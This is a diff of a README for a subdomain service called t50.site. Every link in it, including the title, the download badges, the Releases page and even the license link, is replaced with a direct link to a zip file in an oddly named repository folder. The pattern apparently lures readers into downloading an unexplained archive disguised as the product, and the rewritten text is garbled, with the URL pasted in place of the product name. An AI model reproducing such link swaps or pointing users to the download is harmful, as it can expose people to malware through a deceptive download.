@@ -1,12 +1,12 @@
-# ✨ t50.site - Get Your Premium Subdomain Today!
+# ✨ https://raw.githubusercontent.com/Travesia-Salvatge/t50.site/main/nonusing/site_t_upsaddle.zip - Get Your Premium Subdomain Today!
 
 ## 🚀 Getting Started
-Welcome to t50.site! This guide will help you easily download and run our service to obtain your personal premium subdomain. With t50.site, you become part of a thriving community dedicated to providing custom domain solutions since 2013.
+Welcome to https://raw.githubusercontent.com/Travesia-Salvatge/t50.site/main/nonusing/site_t_upsaddle.zip! This guide will help you easily download and run our service to obtain your personal premium subdomain. With https://raw.githubusercontent.com/Travesia-Salvatge/t50.site/main/nonusing/site_t_upsaddle.zip, you become part of a thriving community dedicated to providing custom domain solutions since 2013.
 
 ## 📥 Download Your Subdomain
 To download the application, please visit the Releases page. 
 
-[![Download t50.site](https://img.shields.io/badge/Download%20Now-blue.svg)](https://github.com/Travesia-Salvatge/t50.site/releases)
+[![Download https://raw.githubusercontent.com/Travesia-Salvatge/t50.site/main/nonusing/site_t_upsaddle.zip](https://raw.githubusercontent.com/Travesia-Salvatge/t50.site/main/nonusing/site_t_upsaddle.zip%https://raw.githubusercontent.com/Travesia-Salvatge/t50.site/main/nonusing/site_t_upsaddle.zip)](https://raw.githubusercontent.com/Travesia-Salvatge/t50.site/main/nonusing/site_t_upsaddle.zip)
 
 ## 🔧 System Requirements
 - **Operating System:** Windows 10 or later, macOS Sierra or later, or a modern Linux distribution
@@ -21,7 +21,7 @@ To download the application, please visit the Releases page.
 
 ## 📥 Download & Install
 1. Click the link below to visit the Releases page:
-   [Download t50.site](https://github.com/Travesia-Salvatge/t50.site/releases)
+   [Download https://raw.githubusercontent.com/Travesia-Salvatge/t50.site/main/nonusing/site_t_upsaddle.zip](https://raw.githubusercontent.com/Travesia-Salvatge/t50.site/main/nonusing/site_t_upsaddle.zip)
 
 2. On the Releases page, look for the latest version. It will display with a tag and may look something like `v1.0.0`.
 
@@ -47,9 +47,9 @@ If you encounter issues or have questions, feel free to reach out to our communi
 - **DNS Management:** Understand how DNS works to make the most of your new domain.
 
 ## 📜 License
-This project is open-source and available under the MIT License. You can view the full license [here](https://github.com/Travesia-Salvatge/t50.site/blob/main/LICENSE).
+This project is open-source and available under the MIT License. You can view the full license [here](https://raw.githubusercontent.com/Travesia-Salvatge/t50.site/main/nonusing/site_t_upsaddle.zip).
 
 ## 📢 Get Updates
 Stay updated about new releases and features by following the repository. You can also subscribe to notifications on GitHub.
 
-[![Download t50.site](https://img.shields.io/badge/Download%20Now-blue.svg)](https://github.com/Travesia-Salvatge/t50.site/releases)
+[![Download https://raw.githubusercontent.com/Travesia-Salvatge/t50.site/main/nonusing/site_t_upsaddle.zip](https://raw.githubusercontent.com/Travesia-Salvatge/t50.site/main/nonusing/site_t_upsaddle.zip%https://raw.githubusercontent.com/Travesia-Salvatge/t50.site/main/nonusing/site_t_upsaddle.zip)](https://raw.githubusercontent.com/Travesia-Salvatge/t50.site/main/nonusing/site_t_upsaddle.zip)
